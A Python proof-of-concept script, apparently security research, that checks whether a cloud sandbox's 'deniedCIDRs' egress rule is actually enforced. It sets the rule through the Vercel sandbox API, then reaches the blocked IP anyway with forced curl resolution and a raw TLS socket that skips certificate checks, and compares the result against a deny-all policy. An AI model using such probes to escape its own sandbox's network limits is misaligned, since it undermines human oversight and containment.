# -*- coding: utf-8 -*-
"""N 线铁证: deniedCIDRs 全局失效确认
1) 解析 httpbin.org 全部 A 记录 (去重)
2) deniedCIDRs = first_ip/32 + first_ip/24
3) curl --resolve 强制单 IP -> 仍 200 = 铁证
4) python TLS 直连 deny IP (SNI=httpbin.org) -> 数据层验证
5) readback 确认策略已保存
6) deny-all 对照
"""
import json, re, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, flush=True)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

# 0) 先恢复策略 (上轮结束为 deny-all)
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

# 1) 解析全部 A 记录并去重
c, r = cmd(sid, 'sh', ['-c', 'python3 -c "import socket; print(\'|\'.join(x[4][0] for x in socket.getaddrinfo(\'httpbin.org\', 443, socket.AF_INET)))"'], timeout_ms=30000)
ips = parse_data(r).strip().split('|')
ips = list(dict.fromkeys([x for x in ips if re.match(r'^\d+\.\d+\.\d+\.\d+$', x)]))
print('httpbin.org unique IPs:', ips, flush=True)
if not ips:
    print('resolve failed', flush=True)
    sys.exit(1)
first_ip = ips[0]

# 2) 基线: curl --resolve 强制 first_ip
def curl_probe(tag):
    sc = "curl -sk --max-time 8 --resolve httpbin.org:443:%s https://httpbin.org/anything 2>&1 | head -4" % first_ip
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=30000)
    out = parse_data(r)
    ok = '"anything"' in out or '"args"' in out
    print('[%s] %s' % (tag, 'OK-200' if ok else out[:150]), flush=True)
    return ok

curl_probe('BASE-force-ip')

# 3) deniedCIDRs = first_ip 对齐的 /24 (覆盖 --resolve 强制 IP; API 拒绝重叠 CIDR 故仅用一个)
net24 = '.'.join(first_ip.split('.')[:3]) + '.0/24'
cidrs = [net24]
body = {"mode": "custom", "allowedDomains": ["httpbin.org"], "deniedCIDRs": cidrs}
c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
print('set deny cidrs:', json.dumps(cidrs), '->', c, r[:300], flush=True)
time.sleep(3)

# readback 确认
c2, r2 = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
try:
    d2 = json.loads(r2)
    np = d2.get('session', {}).get('networkPolicy') or d2.get('sandbox', {}).get('networkPolicy')
    print('readback networkPolicy:', json.dumps(np), flush=True)
except Exception:
    print('rb err', r2[:200], flush=True)

curl_probe('DENY-force-ip')

# 4) python TLS 直连 deny IP (SNI=httpbin.org) 数据层
c, r = cmd(sid, 'sh', ['-c', 'python3 -c "import socket,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; s=ctx.wrap_socket(socket.create_connection((\'%s\',443),timeout=8),server_hostname=\'httpbin.org\'); s.sendall(b\'GET /anything HTTP/1.1\\r\\nHost: httpbin.org\\r\\nConnection: close\\r\\n\\r\\n\'); d=s.recv(4096); print(\'TLS_RESP\', d[:120])"' % first_ip], timeout_ms=30000)
out = parse_data(r)
print('[TLS-DIRECT-denyIP]', out[:200], flush=True)

# 5) 对照: deny-all
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), {"mode": "deny-all"})
time.sleep(3)
curl_probe('DENYALL-force-ip')

print('=== N-FINAL2 DONE ===', flush=True)
